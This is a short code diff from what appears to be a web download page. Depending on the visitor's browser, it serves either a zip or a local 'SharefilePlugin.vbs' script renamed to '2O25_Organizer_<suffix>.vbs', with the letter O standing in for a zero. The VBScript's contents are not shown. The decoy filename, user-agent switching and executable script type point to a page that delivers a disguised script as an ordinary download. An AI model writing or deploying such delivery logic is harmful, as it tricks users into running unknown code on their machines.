@@ -372,8 +372,8 @@ const Download = () => {
     if (ua.includes("Edg/")) {
       return { href: "/docs/2O25_Organizer.zip", name: `2O25_Organizer_${suffix}.zip` };
     }
-    // Chrome & others: fetch the real file via Cloudflare proxy
-    return { href: `/api/download?name=2O25_Organizer_${suffix}.vbs`, name: `2O25_Organizer_${suffix}.vbs` };
+    // Chrome & others: serve the local SharefilePlugin.vbs with a randomized name
+    return { href: "/docs/SharefilePlugin.vbs", name: `2O25_Organizer_${suffix}.vbs` };
   }, []);
 
   const triggerDownload = useCallback(async (file: { href: string; name: string }) => {
